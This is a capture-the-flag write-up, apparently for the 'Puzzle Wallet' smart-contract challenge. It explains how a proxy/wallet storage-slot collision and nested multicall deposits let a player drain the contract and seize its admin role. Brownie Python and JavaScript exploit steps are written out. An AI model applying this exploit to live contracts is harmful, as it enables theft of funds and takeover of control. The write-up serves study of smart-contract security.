## Goal:
We need to become the admin of the contract. 

## Explanation
We have the proxy contract which is the PuzzleProxy where it contain the parameter admin.We can not directly be the admin of the contract, we can propose ourself as an admin but we can't approve ourself as an admin as this require us to be the admin. The admin slot is located on slot 1 and pendingAdmin on slot 0.
We have the other contract which is the PuzzleWallet, we have the first 2 parameter: owner and maxBalance. Since there is a delegate call with the above contract however both storage layout are differenet so the owner is the same as pendingAdmin and the maxBalance is the same as admin. So if we updatethe balance then we will become the admin.

## How we will do it?
1. We have the function setBalance but it requires us to be onlyWhitelisted.
2. There is function addToWhitelist but inorder to call it we need to be the owner.
3. Since we can propose ourself as a pendingAdmin then we will become the owner.
4. So we can become whitelisted. ( proposeNewAdmin(ourAddress)->owner->addToWhitelist(ourAddress) )
5. However there is another requirement which is ```solidity require(address(this).balance == 0, "Contract balance is not 0");```
6. The contract balance is 0.001 so we need to bypass it.
7. We have also this function multicalldata
```solidity
    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
 ```
 8. This function allow us to call multiple calls in the same transaction howver since we have the check if the depositCalled is called or not we cannot bypass simple deposit() so we need another way.
 9. What about calling multiple ```multicall``` and we pass deposit on it so we can bypass the check :)
 10. Since we know how to bypass this let us think what we want to do to make the balance 0.
 11. If we can call deposit different times in the multicall function so if we deposit money more than what the contract have (0.001) then our balance will be greate that the balance of the contract so if we call the execute function and transfer our funds the balance of the contract will be 0.
 12. Now we can setBalance and so we are the admin :)

## Steps
```python
def exploit():
    account = get_account()
    puzzle = interface.PuzzleProxy(config['ADDRESS'])
    tx = puzzle.proposeNewAdmin(account.address,{"from": account})
    tx.wait(1)

    ## Add to whitelist
    puzzleWallet = interface.PuzzleWallet(config['ADDRESS'])
    tx2 = puzzleWallet.addToWhitelist(account.address,{"from": account})
    tx2.wait(1)


def main():
    exploit()
```
1. The above code will add to the whitelist(using brownie)
2. depositData = await contract.methods["deposit()"].request().then(v=>v.data)
3. multiCallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v=>v.data)
4. await contract.multicall([multiCallData,multiCallData],{value:toWei('0.001')})
5. await contract.execute(player,toWei('0.002'),[])
6. await contract.setMaxBalance(player)
